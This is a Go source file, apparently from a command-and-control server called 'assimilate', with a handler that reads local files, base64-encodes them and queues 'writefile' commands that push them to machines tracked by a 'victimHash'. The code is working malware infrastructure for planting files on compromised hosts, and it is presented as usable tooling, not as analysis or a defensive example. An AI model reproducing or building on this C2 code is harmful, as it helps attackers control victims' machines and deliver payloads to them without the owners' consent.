package handlers

import (
	"assimilate/c2c_server/v2/internal/model"
	"assimilate/c2c_server/v2/internal/types"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
)

func WriteFile(state *model.ServerState) types.WriteFileHandlerFunc {
	return func(victimHash string, filenames ...string) {
		for _, filename := range filenames {
			content, err := os.ReadFile(filename)
			if err != nil {
				fmt.Printf("Can't read %s, error: %v\n", filename, err)
				continue
			}
			cmd := types.VictimCommand{
				Commandytype: "writefile",
				Arguments: []string{
					filepath.Base(filename),
					base64.StdEncoding.EncodeToString(content),
				},
			}

			state.AddCommandToVictim(victimHash, cmd)
		}
	}
}
